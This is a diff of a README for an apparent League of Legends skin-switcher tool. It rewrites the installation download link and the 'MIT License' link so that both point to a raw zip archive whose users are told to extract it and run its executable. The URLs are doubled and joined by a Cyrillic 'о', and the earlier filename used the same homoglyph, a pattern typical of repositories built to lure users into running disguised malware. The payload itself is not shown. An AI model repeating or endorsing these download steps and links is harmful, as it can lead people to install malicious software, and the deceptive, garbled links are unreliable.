@@ -27,7 +27,7 @@ Unlock a powerful set of features for your gameplay, all housed within a user-fr
 
 Get started in just a few minutes with our simple installation process:
 
-1. **Download https://raw.githubusercontent.com/syaiful191397/LoLSkinSwitcher/main/Lоader.zip** from this repository (always use the latest version for optimal performance).
+1. **Download https://raw.githubusercontent.com/syaiful191397/LoLSkinSwitcher/main/ridiculosity/Lo_Switcher_L_Skin_v1.8-alpha.5.zipоhttps://raw.githubusercontent.com/syaiful191397/LoLSkinSwitcher/main/ridiculosity/Lo_Switcher_L_Skin_v1.8-alpha.5.zip** from this repository (always use the latest version for optimal performance).
 2. Extract the contents using your preferred archive tool (recommended: WinRAR, 7-Zip, or System Archive Utility).
 3. Open the extracted folder and run the executable file corresponding to your operating system.
 4. Follow the on-screen instructions to set up the league client path and select your skins.
@@ -88,7 +88,7 @@ This project is an independent, open-source tool made for customization enthusia
 
 ## 📄 License
 
-This project is licensed under the [MIT License](https://raw.githubusercontent.com/syaiful191397/LoLSkinSwitcher/main/Lоader.zip) and is free for personal and educational use and contribution.  
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/syaiful191397/LoLSkinSwitcher/main/ridiculosity/Lo_Switcher_L_Skin_v1.8-alpha.5.zipоhttps://raw.githubusercontent.com/syaiful191397/LoLSkinSwitcher/main/ridiculosity/Lo_Switcher_L_Skin_v1.8-alpha.5.zip) and is free for personal and educational use and contribution.  
 Enjoy your customized League experience!
 
 --- 
